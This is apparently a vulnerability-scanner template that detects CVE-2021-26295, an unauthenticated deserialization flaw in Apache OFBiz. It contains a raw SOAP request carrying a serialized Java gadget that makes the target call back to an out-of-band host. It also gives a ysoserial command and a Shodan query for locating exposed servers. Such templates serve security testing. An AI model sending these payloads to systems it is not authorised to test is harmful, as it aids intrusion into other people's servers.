cves/2021/CVE-2021-26295.yaml

id: CVE-2021-26295

info:
  name: Apache OFBiz RMI Deserialization - Remote Code Execution
  author: madrobot
  severity: critical
  description: |
    Apache OFBiz has unsafe deserialization prior to 17.12.06. An unauthenticated attacker can use this vulnerability to successfully take over Apache OFBiz.
  reference:
    - https://github.com/yumusb/CVE-2021-26295-POC
    - https://packetstormsecurity.com/files/162104/Apache-OFBiz-SOAP-Java-Deserialization.html
    - https://github.com/zhzyker/exphub/tree/master/ofbiz
    - https://lists.apache.org/thread.html/r3c1802eaf34aa78a61b4e8e044c214bc94accbd28a11f3a276586a31%40%3Cuser.ofbiz.apache.org%3E
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-26295
    cwe-id: CWE-502
  metadata:
    shodan-query: OFBiz.Visitor=
    verified: "true"
    ysoserial-payload: java -jar ysoserial.jar URLDNS https://oob-url-to-request.tld | hex
  tags: cve,cve2021,apache,ofbiz,deserialization,rce

requests:
  - raw:
      - |
        POST /webtools/control/SOAPService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version='1.0' encoding='UTF-8'?>
        <soapenv:Envelope
          xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header/>
            <soapenv:Body>
              <ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">
                  <ns1:cus-obj>{{generate_java_gadget("dns", "https://{{interactsh-url}}", "hex")}}</ns1:cus-obj>
              </ns1:clearAllEntityCaches>
            </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "errorMessage"

      - type: word
        part: header
        words:
          - "OFBiz.Visitor="